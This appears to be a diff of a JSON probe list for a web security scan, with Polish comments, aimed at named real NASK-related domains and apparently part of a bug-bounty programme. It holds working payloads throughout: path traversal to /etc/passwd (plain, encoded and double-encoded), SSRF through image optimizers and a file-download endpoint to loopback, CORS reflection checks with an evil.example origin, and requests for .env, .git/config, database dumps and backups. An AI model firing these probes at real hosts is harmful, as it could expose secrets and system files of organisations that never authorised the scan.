@@ -1,229 +1,60 @@
 {
-  "run": "006",
-  "note": "Wave 2: SSRF w /_next/image, CORS, obejscie filtra download-file przez zakodowany schemat, odkrywanie API HIVE.",
+  "run": "007",
+  "note": "Wave 3: pliki konfiguracyjne i backupy na wszystkich hostach z zakresu. GET, read-only. Kazda odpowiedz jest odejmowana od catch-all tego hosta, wiec SPA zwracajace 200 na wszystko nie da falszywych trafien. Forma macierzy: te same sciezki x kazdy host.",
+  "matrix": {
+    "hosts": [
+      "nask.pl",
+      "dyzurnet.pl",
+      "dns.pl",
+      "oad.nask.pl",
+      "zglos-dezinformacje.nask.pl",
+      "bezpiecznymiesiac.pl",
+      "116sos.pl",
+      "pllum.org.pl",
+      "science.nask.pl",
+      "dataannotation.pllum.org.pl"
+    ],
+    "paths": [
+      { "path": "/.env", "note": "plik srodowiskowy z sekretami aplikacji" },
+      { "path": "/.env.local", "note": "wariant .env" },
+      { "path": "/.git/config", "note": "konfiguracja repo git -> pelne zrodla" },
+      { "path": "/.git/HEAD", "note": "wskaznik repo git" },
+      { "path": "/wp-config.php.bak", "note": "kopia konfiguracji WordPress z danymi bazy" },
+      { "path": "/backup.zip", "note": "archiwum kopii zapasowej" },
+      { "path": "/db.sql", "note": "zrzut bazy danych" },
+      { "path": "/server-status", "note": "status serwera Apache" }
+    ]
+  },
   "probes": [
     {
-      "id": "bm-proc-version",
-      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=/proc/version",
-      "note": "sciezka absolutna BEZ kropek: rozroznia 'sciezka doklejana do media' od 'sciezka absolutna'"
+      "id": "sci-media-dotdot-encoded",
+      "url": "https://science.nask.pl/api/media/..%2f..%2f..%2f..%2fetc%2fpasswd",
+      "note": "science: traversal zakodowanym separatorem. Url::parse NIE traktuje '..%2f' jako segmentu '.'/'..', wiec zadanie wychodzi nietkniete, a serwer moze je zdekodowac"
     },
     {
-      "id": "bm-etc-hostname",
-      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=/etc/hostname",
-      "note": "kolejna sciezka absolutna bez kropek"
+      "id": "sci-media-double-encoded",
+      "url": "https://science.nask.pl/api/media/%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+      "note": "science: podwojne kodowanie - dziala, gdy dekoder jest wywolany dwa razy"
     },
     {
-      "id": "bm-os-release",
-      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=/etc/os-release",
-      "note": "identyfikacja systemu, jesli odczyt absolutny dziala"
+      "id": "sci-media-abs",
+      "url": "https://science.nask.pl/api/media/etc/passwd",
+      "note": "science: sciezka bez traversal, ale od korzenia"
     },
     {
-      "id": "bm-scheme-enc",
-      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=http%3A%2F%2Fscience.nask.pl%2Frobots.txt",
-      "note": "SSRF: schemat zakodowany. Filtr sprawdza surowe '://', ktorego tu nie ma"
+      "id": "sci-media-url",
+      "url": "https://science.nask.pl/api/media/https://science.nask.pl/robots.txt",
+      "note": "science: czy proxy mediow przyjmuje PELNY URL (SSRF), czy tylko sciezke"
     },
     {
-      "id": "bm-scheme-halfenc",
-      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=https:%2F%2Fscience.nask.pl%2Frobots.txt",
-      "note": "SSRF: zakodowane tylko separatory"
+      "id": "sci-media-robots",
+      "url": "https://science.nask.pl/api/media/robots.txt",
+      "note": "science: kontrola - czy /api/media serwuje dowolny plik spod roota aplikacji"
     },
     {
-      "id": "bm-scheme-case",
-      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=HTTPS://science.nask.pl/robots.txt",
-      "note": "SSRF: wielkie litery schematu, jesli filtr porownuje 'https://' doslownie"
-    },
-    {
-      "id": "bm-dot-segment",
-      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=/media/./../../etc/passwd",
-      "note": "traversal z poprawnym prefiksem i segmentem '.'"
-    },
-    {
-      "id": "hive-openapi",
-      "url": "https://dataannotation.pllum.org.pl/openapi.json",
-      "note": "HIVE: jesli backend to FastAPI, openapi.json daje pelna mape API",
-      "snippet": true
-    },
-    {
-      "id": "hive-api-root",
-      "url": "https://dataannotation.pllum.org.pl/api/v1",
-      "note": "HIVE: korzen API - sprawdzic, czy zwraca liste zasobow",
-      "snippet": true
-    },
-    {
-      "id": "hive-api-slash",
-      "url": "https://dataannotation.pllum.org.pl/api/v1/",
-      "note": "HIVE: korzen API z ukosnikiem",
-      "snippet": true
-    },
-    {
-      "id": "hive-docs",
-      "url": "https://dataannotation.pllum.org.pl/docs",
-      "note": "HIVE: dokumentacja interaktywna (FastAPI domyslnie pod /docs)",
-      "snippet": true
-    },
-    {
-      "id": "zglos-sendform-get",
-      "url": "https://zglos-dezinformacje.nask.pl/api/sendForm",
-      "note": "GET na endpoint przyjmujacy POST: sprawdzic kod i komunikat (metoda vs brak autoryzacji)",
-      "snippet": true
-    },
-    {
-      "id": "nextimg-oad-external",
-      "url": "https://oad.nask.pl/_next/image?url=https%3A%2F%2Fscience.nask.pl%2Frobots.txt&w=64&q=75",
-      "note": "SSRF: optymalizator obrazkow pobiera zdalny URL sposrod hostow programu",
-      "snippet": true
-    },
-    {
-      "id": "nextimg-oad-loopback",
-      "url": "https://oad.nask.pl/_next/image?url=http%3A%2F%2F127.0.0.1%2F&w=64&q=75",
-      "note": "SSRF: optymalizator -> loopback",
-      "snippet": true
-    },
-    {
-      "id": "nextimg-dyz-external",
-      "url": "https://dyzurnet.pl/_next/image?url=https%3A%2F%2Fscience.nask.pl%2Frobots.txt&w=64&q=75",
-      "note": "SSRF: optymalizator obrazkow",
-      "snippet": true
-    },
-    {
-      "id": "nextimg-dyz-loopback",
-      "url": "https://dyzurnet.pl/_next/image?url=http%3A%2F%2F127.0.0.1%2F&w=64&q=75",
-      "note": "SSRF: optymalizator -> loopback",
-      "snippet": true
-    },
-    {
-      "id": "nextimg-sci-external",
-      "url": "https://science.nask.pl/_next/image?url=https%3A%2F%2Fnask.pl%2F&w=64&q=75",
-      "note": "SSRF: optymalizator obrazkow",
-      "snippet": true
-    },
-    {
-      "id": "nextimg-bm-external",
-      "url": "https://bezpiecznymiesiac.pl/_next/image?url=https%3A%2F%2Fnask.pl%2F&w=64&q=75",
-      "note": "SSRF: optymalizator obrazkow",
-      "snippet": true
-    },
-    {
-      "id": "nextimg-sos-external",
-      "url": "https://116sos.pl/_next/image?url=https%3A%2F%2Fnask.pl%2F&w=64&q=75",
-      "note": "SSRF: optymalizator obrazkow",
-      "snippet": true
-    },
-    {
-      "id": "nextimg-zglos-external",
-      "url": "https://zglos-dezinformacje.nask.pl/_next/image?url=https%3A%2F%2Fnask.pl%2F&w=64&q=75",
-      "note": "SSRF: optymalizator obrazkow",
-      "snippet": true
-    },
-    {
-      "id": "cors-zglos",
-      "url": "https://zglos-dezinformacje.nask.pl/api/sendForm",
-      "headers": {
-        "Origin": "https://evil.example"
-      },
-      "note": "CORS: czy serwer odbija obcy Origin (placone, gdy pozwala czytac dane)",
-      "snippet": true
-    },
-    {
-      "id": "cors-dns",
-      "url": "https://dns.pl/api/who-is-xml/",
-      "headers": {
-        "Origin": "https://evil.example"
-      },
-      "note": "CORS na API rejestru domen",
-      "snippet": true
-    },
-    {
-      "id": "cors-sos",
-      "url": "https://116sos.pl/api/announcements",
-      "headers": {
-        "Origin": "https://evil.example"
-      },
-      "note": "CORS na API ogloszen",
-      "snippet": true
-    },
-    {
-      "id": "cors-hive",
-      "url": "https://dataannotation.pllum.org.pl/api/v1",
-      "headers": {
-        "Origin": "https://evil.example"
-      },
-      "note": "CORS na API HIVE",
-      "snippet": true
-    },
-    {
-      "id": "cors-pllum",
-      "url": "https://pllum.org.pl/api/_content/query",
-      "headers": {
-        "Origin": "https://evil.example"
-      },
-      "note": "CORS na API tresci PLLuM (Nuxt content)",
-      "snippet": true
-    },
-    {
-      "id": "cors-oad",
-      "url": "https://oad.nask.pl/api/",
-      "headers": {
-        "Origin": "https://evil.example"
-      },
-      "note": "CORS na API OAD",
-      "snippet": true
-    },
-    {
-      "id": "cors-sci",
-      "url": "https://science.nask.pl/wp-json/",
-      "headers": {
-        "Origin": "https://evil.example"
-      },
-      "note": "CORS na WordPress REST (sprawdzic takze, czy REST jest otwarty)",
-      "snippet": true
-    },
-    {
-      "id": "cors-dyz",
-      "url": "https://dyzurnet.pl/api/",
-      "headers": {
-        "Origin": "https://evil.example"
-      },
-      "note": "CORS na API dyzurnet",
-      "snippet": true
-    },
-    {
-      "id": "cors-bm",
-      "url": "https://bezpiecznymiesiac.pl/download-file/?fileUrl=/media/2026/10/NASK_poradnik-IoT.pdf",
-      "headers": {
-        "Origin": "https://evil.example"
-      },
-      "note": "CORS na endpointcie pobierania plikow",
-      "snippet": false
-    },
-    {
-      "id": "pllum-nuxt-content",
-      "url": "https://pllum.org.pl/api/_content/query",
-      "note": "Nuxt content API: sprawdzic, czy zwraca dane spoza opublikowanych tresci",
-      "snippet": true
-    },
-    {
-      "id": "dns-api-v1",
-      "url": "https://dns.pl/api/v1/",
-      "note": "wariant bazowy API rejestru",
-      "snippet": true
-    },
-    {
-      "id": "dns-api-root",
-      "url": "https://dns.pl/api/",
-      "note": "korzen API rejestru",
-      "snippet": true
-    },
-    {
-      "id": "sci-wp-json",
-      "url": "https://science.nask.pl/wp-json/",
-      "note": "WordPress REST: sprawdzic, czy wystawiony i jaki ma zakres",
-      "snippet": true
-    },
-    {
-      "id": "sci-wp-media-proxy-control",
-      "url": "https://science.nask.pl/api/media/wp-content/uploads/sites/4/2023/06/Struktura-s-e1687258346784.jpg",
-      "note": "kontrola: czy proxy mediow odpowiada (w przebiegu 004b bylo 0/5 - blad transportu)"
+      "id": "zglos-static-env",
+      "url": "https://zglos-dezinformacje.nask.pl/api/sendForm/../.env",
+      "note": "zglos: normalizacja sciezki po stronie serwera (u nas zostaje w URL, serwer moze znormalizowac i podac .env)"
     }
   ]
 }
